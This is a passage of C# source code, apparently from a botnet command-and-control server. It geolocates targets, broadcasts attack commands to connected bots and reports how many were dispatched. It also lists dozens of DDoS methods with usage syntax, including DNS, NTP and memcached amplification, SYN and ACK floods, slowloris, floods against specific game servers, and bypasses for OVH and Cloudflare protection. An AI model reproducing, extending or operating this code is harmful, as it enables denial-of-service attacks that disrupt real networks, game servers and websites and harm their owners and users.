                    var task = _httpClient.GetStringAsync(url);
                    if (task.Wait(2500))
                    {
                        using var doc = JsonDocument.Parse(task.Result);
                        var root = doc.RootElement;
                        if (root.TryGetProperty("status", out var statusProp) && statusProp.GetString() == "success")
                        {
                            if (root.TryGetProperty("country", out var cProp)) info.Country = cProp.GetString() ?? "Unknown";
                            if (root.TryGetProperty("regionName", out var rProp)) info.Region = rProp.GetString() ?? "Unknown";
                            if (root.TryGetProperty("isp", out var iProp)) info.Isp = iProp.GetString() ?? "Unknown";
                            if (root.TryGetProperty("as", out var aProp)) info.Asn = aProp.GetString() ?? "Unknown";
                        }
                    }
                }
            }
            catch
            {
                // Fallback gracefully on DNS/API errors
            }
            return info;
        }

        private static string FormatDispatchResponse(string methodName, string targetHost, string port, string time, int botCount)
        {
            var geo = ResolveTargetGeo(targetHost);
            var sb  = new StringBuilder();

            string rule = $"{CDim}{'─'.ToString().PadRight(48, '─')}{C0}";

            sb.Append(Ln());
            sb.Append(Ln($"  {rule}"));
            sb.Append(Ln($"  {CKey}{"target",-9}{C0}  {CVal}{targetHost}{C0}"));
            sb.Append(Ln($"  {CKey}{"ip",-9}{C0}  {CIP}{geo.ResolvedIp}{C0}"));
            if (port != "N/A")
                sb.Append(Ln($"  {CKey}{"port",-9}{C0}  {CNum}{port}{C0}"));
            sb.Append(Ln($"  {CKey}{"duration",-9}{C0}  {CNum}{time}s{C0}"));
            sb.Append(Ln($"  {CKey}{"method",-9}{C0}  {CCmd}.{methodName.ToUpper()}{C0}"));
            sb.Append(Ln($"  {CDim}{'─'.ToString().PadRight(48, '─')}{C0}"));
            sb.Append(Ln($"  {CKey}{"isp",-9}{C0}  {CDesc}{geo.Isp}{C0}"));
            sb.Append(Ln($"  {CKey}{"region",-9}{C0}  {CDesc}{geo.Region}, {geo.Country}{C0}"));
            sb.Append(Ln($"  {CKey}{"asn",-9}{C0}  {CDesc}{geo.Asn}{C0}"));
            sb.Append(Ln($"  {CDim}{'─'.ToString().PadRight(48, '─')}{C0}"));
            sb.Append(Ln($"  {CKey}{"swarm",-9}{C0}  {CGood}{botCount} bot{(botCount == 1 ? "" : "s")} dispatched{C0}"));
            sb.Append(Ln());

            return Send(sb);
        }

        private static List<string> ExtractPlaceholders(string template)
        {
            var list = new List<string>();
            var matches = System.Text.RegularExpressions.Regex.Matches(template, @"\{[^}]+\}");
            foreach (System.Text.RegularExpressions.Match match in matches)
            {
                list.Add(match.Value);
            }
            return list;
        }

        private static int BroadcastToBots(string command)
        {
            byte[] data = Encoding.UTF8.GetBytes(command + "\n");
            int count = 0;
            foreach (var kvp in _botStreams)
            {
                try
                {
                    kvp.Value.Write(data, 0, data.Length);
                    count++;
                }
                catch
                {
                }
            }
            return count;
        }

        private static string GetFormattedMethodsMenu()
        {
            if (_methods.Count == 0)
                return Ln($"  {CErr}error{C0}  {CDim}│{C0}  {CDesc}no methods configured in methods.json{C0}");

            var descriptions = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                // LAYER 4 UDP
                ["dns"]       = "DNS flood, overwhelms name servers with forged queries",
                ["udp"]       = "UDP flood, massive spoofed datagram traffic",
                ["ldap"]      = "LDAP flood, overwhelms directory servers with bulk binds",
                ["ssdp"]      = "SSDP flood, overloads devices with discovery requests",
                ["ntp"]       = "NTP amplification flood, abuses monlist responses",
                ["memcached"] = "Memcached amplification, high-bandwidth UDP reflection",
                ["home"]      = "Home DNS flood, targets home network DNS servers",
                ["udpbypass"] = "UDP Bypass, random-payload packets designed to bypass filters",

                // LAYER 4 TCP
                ["tcp"]       = "TCP flood, excessive SYN/connection requests",
                ["socket"]    = "Socket flood, exhausts resources via open connections",
                ["slowloris"] = "Slowloris, keeps connections half-open to starve server threads",
                ["ovh"]       = "OVH bypass, anti-DDoS protection bypass technique",
                ["tcpmix"]    = "TCP Mix, combines multiple techniques to exhaust resources",
                ["tcpbypass"] = "TCP Bypass, packets designed to bypass stateful filtering",
                ["ack"]       = "ACK flood, disrupts connections with spoofed TCP ACK packets",

                // LAYER 4 GAME
                ["game"]       = "Generic game flood, UDP packets disrupt gameplay",
                ["rainbow"]    = "Rainbow Six flood, excessive UDP connection requests",
                ["rocket"]     = "Rocket League flood, exhausts server via UDP connections",
                ["roblox"]     = "Roblox flood, RakNet handshake packets overload servers",
                ["fivem"]      = "FiveM flood, getinfo queries disrupt multiplayer sessions",
                ["pubg"]       = "PUBG flood, crafted UDP packets bypass game filters",
                ["fortnite"]   = "Fortnite flood, UDP packets cause lag and disconnects",
                ["warthunder"] = "War Thunder flood, massive UDP session disruption",
                ["counter"]    = "Counter-Strike flood, Source Engine query packets",
                ["samp"]       = "SA-MP flood, server query packets overload game servers",
                ["minecraft"]  = "Minecraft flood, legacy server ping packets",

                // LAYER 3
                ["subnet"] = "Subnet flood, ICMP packets sprayed across an entire /24",
                ["icmp"]   = "ICMP flood, echo requests saturate network bandwidth",

                // LAYER 7 — HTTP/1.1
                ["http"]    = "HTTP/1.1 GET flood, plain-text requests via keep-alive",
                ["https"]   = "HTTPS/1.1 flood, TLS-encrypted GET requests",
                ["httpx"]   = "HTTP-X flood, randomised headers + cache-busting params",
                ["browser"] = "Browser emulation flood, full Chrome-like header fingerprint",

                // LAYER 7 — HTTP/2 (native nghttp2)
                ["http2"]      = "HTTP/2 flood, native multiplexed streams per TLS connection",
                ["tls"]        = "HTTP/2 TLS flood, encrypted stream exhaustion via H2 HEADERS",
                ["tlsx"]       = "HTTP/2 TLS-X, cache-busting + IP-spoofing headers over H2",
                ["bypass"]     = "HTTP/2 bypass, X-Forwarded-For rotation over H2 streams",
                ["cache"]      = "HTTP/2 cache buster, no-store/no-cache defeats CDN caching",
                ["rapidflood"] = "HTTP/2 rapid flood, max concurrent streams per connection",
                ["cloudflare"] = "HTTP/2 Cloudflare bypass, CF-Ray + CF-Connecting-IP spoofing",
            };

            var l4Udp  = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "dns", "udp", "ldap", "ssdp", "ntp", "memcached", "home", "udpbypass" };
            var l4Tcp  = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "tcp", "socket", "slowloris", "ovh", "tcpmix", "tcpbypass", "ack" };
            var l4Game = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "game", "rainbow", "rocket", "roblox", "fivem", "pubg", "fortnite", "warthunder", "counter", "samp", "minecraft" };
            var l3     = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "subnet", "icmp" };
            var l7h1   = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "http", "https", "httpx", "browser" };
            var l7h2   = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "http2", "tls", "tlsx", "bypass", "cache", "rapidflood", "cloudflare" };

            var sb   = new StringBuilder();
            string rule = $"{CDim}{'─'.ToString().PadRight(52, '─')}{C0}";

            // Category label colors — distinct but muted, no bold
            const string CL4U  = "\x1b[38;5;69m";  // steel blue   — UDP
            const string CL4T  = "\x1b[38;5;75m";  // sky blue     — TCP
            const string CL4G  = "\x1b[38;5;179m"; // amber        — Game
            const string CL3   = "\x1b[38;5;167m"; // muted red    — L3
            const string CL7H1 = "\x1b[38;5;71m";  // sage green   — L7 H1
            const string CL7H2 = "\x1b[38;5;77m";  // bright green — L7 H2
            const string CCust = "\x1b[38;5;243m"; // grey         — custom

            sb.Append(Ln());
            sb.Append(Ln($"  {CHead}METHODS{C0}"));
            sb.Append(Ln($"  {rule}"));

            void AppendCategory(string label, string labelColor, HashSet<string> names)
            {
                var active = _methods.Where(m => names.Contains(m.Name)).ToList();
                if (active.Count == 0) return;

                sb.Append(Ln());
                sb.Append(Ln($"  {labelColor}{label}{C0}"));
                foreach (var m in active)
                {
                    string desc = descriptions.TryGetValue(m.Name, out var d) ? d : "custom method";
                    sb.Append(Ln($"    {CCmd}{$".{m.Name}",-15}{C0}  {CDim}│{C0}  {CDesc}{desc}{C0}"));
                }
            }

            AppendCategory("L4 UDP   amplification & bypass",   CL4U,  l4Udp);
            AppendCategory("L4 TCP   flood & bypass",           CL4T,  l4Tcp);
            AppendCategory("L4 GAME  specialized udp / tcp",    CL4G,  l4Game);
            AppendCategory("L3       network protocols",         CL3,   l3);
            AppendCategory("L7 H1.1  tls + plain",              CL7H1, l7h1);
            AppendCategory("L7 H2    native multiplexed",       CL7H2, l7h2);

            var knownAll = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var s in new[] { l4Udp, l4Tcp, l4Game, l3, l7h1, l7h2 })
                foreach (var n in s) knownAll.Add(n);

            var others = _methods.Where(m => !knownAll.Contains(m.Name)).ToList();
            if (others.Count > 0)
            {
                var otherSet = new HashSet<string>(others.Select(o => o.Name), StringComparer.OrdinalIgnoreCase);
                AppendCategory("CUSTOM", CCust, otherSet);
            }

            sb.Append(Ln());
            sb.Append(Ln($"  {rule}"));
            sb.Append(Ln($"  {CKey}{"l4 usage",-10}{C0}  {CDesc}.method {CVal}<host> <port> <time>{C0}"));
            sb.Append(Ln($"  {CKey}{"l7 usage",-10}{C0}  {CDesc}.method {CVal}<url> <port> <time>  {CDim}(port 0 = auto){C0}"));
            sb.Append(Ln($"  {CKey}{"example",-10}{C0}  {CCmd}.http2 {CUrl}https://example.com {CNum}443 60{C0}"));
            sb.Append(Ln());

            return Send(sb);
        }

        private static string GetOrGenerateKey(string fileName, Func<string> generateKey)
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
            if (File.Exists(path))
            {
                return File.ReadAllText(path);
            }

            if (File.Exists(fileName))
            {
                return File.ReadAllText(fileName);
            }

            string newKey = generateKey();
            try
            {
                File.WriteAllText(path, newKey);
            }
            catch
            {
                File.WriteAllText(fileName, newKey);
            }
            return newKey;
        }
    }
}
